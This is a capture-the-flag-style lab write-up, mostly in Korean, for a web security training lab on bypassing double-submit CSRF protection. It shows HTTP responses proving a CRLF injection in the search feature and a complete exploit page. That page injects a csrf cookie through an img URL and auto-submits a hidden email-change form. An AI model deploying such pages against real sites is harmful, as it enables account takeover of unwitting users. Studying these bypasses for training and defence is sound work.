# 🚩Lab: CSRF where token is duplicated in cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

### 🔍 분석 및 공격 과정
1. 랩에 접속하자 마자 눈에 띈건 search. 그래서 임의의 문자열 검색해보고 proxy로 살펴봄.

```html
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=exa; Secure; HttpOnly
Set-Cookie: session=9bfgCLXQiSxD4rF5OuxrOewerfuaahwD; Secure; HttpOnly; SameSite=None
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
```
2. 검색한 문자열을 `LastSearchTerm`의 쿠키값으로 넣고 있음. `\r\n`을 이스케이프 처리 하는지 체크해보자.
3. `exa%0d%0aSet-Cookie:` 검색.
   
```html
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=exa
Set-Cookie: ; Secure; HttpOnly
Set-Cookie: session=TvOmSuaydhRdXhwU6raaNZWd0IQWmk0f; Secure; HttpOnly; SameSite=None
```
4. `\r\n`을 줄바꿈으로 제대로 인식중. 새로운 쿠키를 쓰거나 덮어쓰기 가능.
5. 해당 취약점을 활용해 CSRF 이중제출 검증을 통과하는게 목표인 것 같다.
6. wiener로 로그인 하여 email 제출 요청 프록시로 살펴보기
7. Cookie와 제출 파라미터로써 csrf 동시에 존재하며 같은 값을 갖고 있음.
8. 두 값이 일치하기만 하면 통과되는 것인지 체크. 임의의 값으로 변경후 Forward -> 이메일 변경 성공.
9. 그렇다면, 앞에서 발견한 search기능의 취약점으로 csrf값을 임의의 값으로 덮어쓴 후 그 임의의 값과 같은 값을 csrf파라미터에 넣어 이메일을 변경하는 HTML 페이지 작성.

```html
<form method="POST" action="https://0a8c008a04ef3658808f124400120061.web-security-academy.net/my-account/change-email">
    <input name="email" value="hack@never.com">
    <input name="csrf" value="fake">
</form>
<img src="https://0a8c008a04ef3658808f124400120061.web-security-academy.net/?search=exa%0d%0aSet-Cookie%3acsrf=fake%3bSameSite=None" onerror=document.forms[0].submit() >
```
                        
### 💡 취약점 원리
  검색기능에 CRLF injection 취약점으로 인해 공격자가 사용자의 특정 쿠키 값을 마음대로 조작할 수 있음. 애플리케이션은 `쿠키의 csrf 값`과 요청 본문의 `csrf 파라미터`가 동일한지만 검증하는 Double Submit Cookie 방어를 사용
 하고 있어 공격자가 쿠키와 파라미터에 동일한 임의의 값을 세팅하여 우회가 가능했다.
